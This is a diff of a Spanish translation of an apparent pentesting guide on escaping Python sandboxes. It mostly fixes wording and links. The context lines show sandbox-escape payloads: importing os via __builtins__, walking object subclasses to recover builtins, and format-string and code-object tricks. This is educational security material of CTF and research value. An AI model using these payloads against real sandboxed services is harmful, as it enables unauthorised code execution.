@@ -39,7 +39,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Recuerda que las funciones _**open**_ y _**read**_ pueden ser útiles para **leer archivos** dentro de la sandbox de python y para **escribir algún código** que podrías **ejecutar** para **eludir** la sandbox.
+Recuerda que las funciones _**open**_ y _**read**_ pueden ser útiles para **leer archivos** dentro del sandbox de python y para **escribir algún código** que podrías **ejecutar** para **eludir** el sandbox.
 
 > [!CAUTION]
 > La función **input()** de Python2 permite ejecutar código python antes de que el programa se bloquee.
@@ -48,7 +48,7 @@ Python intenta **cargar bibliotecas del directorio actual primero** (el siguient
 
 ![](<../../../images/image (559).png>)
 
-## Eludir la sandbox de pickle con los paquetes de python instalados por defecto
+## Eludir el sandbox de pickle con los paquetes de python instalados por defecto
 
 ### Paquetes por defecto
 
@@ -88,7 +88,7 @@ Puedes descargar el paquete para crear el reverse shell aquí. Por favor, ten en
 ## Eval-ing python code
 
 > [!WARNING]
-> Ten en cuenta que exec permite cadenas de múltiples líneas y ";", pero eval no (ver operador walrus)
+> Ten en cuenta que exec permite cadenas de varias líneas y ";", pero eval no (ver operador walrus)
 
 Si ciertos caracteres están prohibidos, puedes usar la representación **hex/octal/B64** para **bypassear** la restricción:
 ```python
@@ -136,7 +136,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypass de protecciones a través de codificaciones (UTF-7)
 
-En [**este informe**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) se utiliza UFT-7 para cargar y ejecutar código python arbitrario dentro de una aparente sandbox:
+En [**este informe**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) se utiliza UTF-7 para cargar y ejecutar código python arbitrario dentro de una aparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -151,7 +151,7 @@ También es posible eludirlo utilizando otras codificaciones, por ejemplo, `raw_
 
 ## Ejecución de Python sin llamadas
 
-Si estás dentro de una cárcel de python que **no te permite hacer llamadas**, todavía hay algunas formas de **ejecutar funciones arbitrarias, código** y **comandos**.
+Si estás dentro de una cárcel de python que **no te permite hacer llamadas**, todavía hay algunas maneras de **ejecutar funciones arbitrarias, código** y **comandos**.
 
 ### RCE con [decoradores](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -292,7 +292,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Leer archivo con ayuda y licencia de builtins
+### Leer archivo con ayuda de builtins y licencia
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -306,15 +306,15 @@ pass
 - [**Funciones integradas de python2**](https://docs.python.org/2/library/functions.html)
 - [**Funciones integradas de python3**](https://docs.python.org/3/library/functions.html)
 
-Si puedes acceder al objeto **`__builtins__`** puedes importar bibliotecas (ten en cuenta que también podrías usar aquí otra representación de cadena mostrada en la última sección):
+Si puedes acceder al objeto **`__builtins__`**, puedes importar bibliotecas (ten en cuenta que también podrías usar aquí otra representación de cadena mostrada en la última sección):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Cuando no tienes `__builtins__`, no podrás importar nada ni siquiera leer o escribir archivos ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
-Sin embargo, **por defecto, python importa muchos módulos en memoria**. Estos módulos pueden parecer benignos, pero algunos de ellos **también importan funcionalidades peligrosas** dentro de ellos que pueden ser accedidas para obtener incluso **ejecución de código arbitrario**.
+Cuando no tienes `__builtins__` no podrás importar nada ni siquiera leer o escribir archivos ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
+Sin embargo, **por defecto, python importa muchos módulos en memoria**. Estos módulos pueden parecer benignos, pero algunos de ellos **también importan funcionalidades peligrosas** dentro de ellos que pueden ser accedidas para obtener incluso **ejecución arbitraria de código**.
 
 En los siguientes ejemplos puedes observar cómo **abusar** de algunos de estos módulos "**benignos**" cargados para **acceder** a **funcionalidades** **peligrosas** dentro de ellos.
 
@@ -358,7 +358,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **builtins**.
+[**A continuación hay una función más grande**](#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **builtins**.
 
 #### Python2 y Python3
 ```python
@@ -376,7 +376,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals y locales
 
-Verificar los **`globals`** y **`locals`** es una buena manera de saber a qué puedes acceder.
+Comprobar los **`globals`** y **`locals`** es una buena manera de saber a qué puedes acceder.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -400,7 +400,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **globals**.
+[**A continuación hay una función más grande**](#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **globals**.
 
 ## Descubrir Ejecución Arbitraria
 
@@ -701,7 +701,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Más ejemplos** sobre **ejemplos** de **cadenas de formato** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
+**Más ejemplos** sobre **ejemplos de** **cadenas de formato** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
 
 > [!CAUTION]
 > Consulta también la siguiente página para gadgets que **leerán información sensible de los objetos internos de Python**:
@@ -736,7 +736,7 @@ Según el [**desafío TypeMonkey de este informe**](https://corgi.rip/posts/buck
 
 Como recordatorio, cada vez que se realiza una acción en python, se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
 
-Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](./#python-execution-without-calls).
+Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](#python-execution-without-calls).
 
 Una vulnerabilidad de cadena de formato en python no permite ejecutar funciones (no permite usar paréntesis), por lo que no es posible obtener RCE como `'{0.system("/bin/sh")}'.format(os)`.\
 Sin embargo, es posible usar `[]`. Por lo tanto, si una biblioteca común de python tiene un método **`__getitem__`** o **`__getattr__`** que ejecuta código arbitrario, es posible abusar de ellos para obtener RCE.
@@ -805,7 +805,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Vea aquí más lugares para obtener globals**](./#globals-and-locals)
+[**Ver aquí más lugares para obtener globals**](#globals-and-locals)
 
 ### **Accediendo al código de la función**
 
@@ -823,7 +823,7 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
-### Obtener información del código
+### Obteniendo Información del Código
 ```python
 # Another example
 s = '''
@@ -965,7 +965,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Recreando una función filtrada
+### Recreating a leaked function
 
 > [!WARNING]
 > En el siguiente ejemplo, vamos a tomar todos los datos necesarios para recrear la función directamente del objeto de código de la función. En un **ejemplo real**, todos los **valores** para ejecutar la función **`code_type`** es lo que **necesitarás filtrar**.
@@ -1029,11 +1029,11 @@ Usando herramientas como [**https://www.decompiler.com/**](https://www.decompile
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
 {{#endref}}
 
-## Python Varios
+## Misc Python
 
 ### Assert
 
-Python ejecutado con optimizaciones con el parámetro `-O` eliminará las declaraciones de aserción y cualquier código condicional al valor de **debug**.\
+Python ejecutado con optimizaciones con el parámetro `-O` eliminará las declaraciones de aserción y cualquier código condicional en el valor de **debug**.\
 Por lo tanto, verificaciones como
 ```python
 def check_permission(super_user):
